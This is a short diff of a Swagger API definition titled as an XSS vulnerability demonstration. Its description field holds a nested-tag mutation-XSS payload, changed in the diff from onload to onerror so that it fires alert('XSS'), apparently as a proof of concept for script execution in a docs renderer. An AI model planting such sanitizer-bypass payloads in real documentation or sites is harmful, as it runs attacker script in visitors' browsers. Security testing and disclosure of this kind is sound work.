@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Faithcsde API XSS vulnerability
   description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onload=alert('XSS') src=https://play-lh.googleusercontent.com/QibzA-9E6K49loUUh7LZw_iBOR6zfDZ7sfU_lF3HPRK1YVmFwE8R4Jp8xOMZxvrb3C72>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
   version: production
 basePath: /docs/
 produces:
